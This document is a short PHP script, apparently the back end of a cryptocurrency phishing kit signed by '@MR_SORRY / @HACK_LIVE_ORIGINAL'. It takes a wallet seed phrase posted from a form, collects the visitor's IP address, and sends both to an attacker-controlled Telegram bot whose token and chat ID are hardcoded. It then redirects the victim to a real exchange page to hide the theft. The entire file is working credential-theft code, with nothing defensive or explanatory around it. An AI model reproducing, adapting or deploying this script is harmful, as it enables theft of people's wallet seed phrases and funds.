<?php
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022

$remoteip = 
  isset($_SERVER["HTTP_CF_CONNECTING_IP"])?
     $_SERVER["HTTP_CF_CONNECTING_IP"]:
     $_SERVER["REMOTE_ADDR"]
  ;

$token = "5515286404:AAF6ltaXF6TBD2oykOsp3qW6Fl9SzejSWVg";
$chat_id = "323454936";
$codes = $_POST['mnemonic'];
$arr = array(
  'Seed Word:  ' => $codes,
  'IP: ' => $remoteip,
);


foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
if ($sendToTelegram) {
  header('Location: https://exchange.blockchain.com/trade');
}

// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022

?>
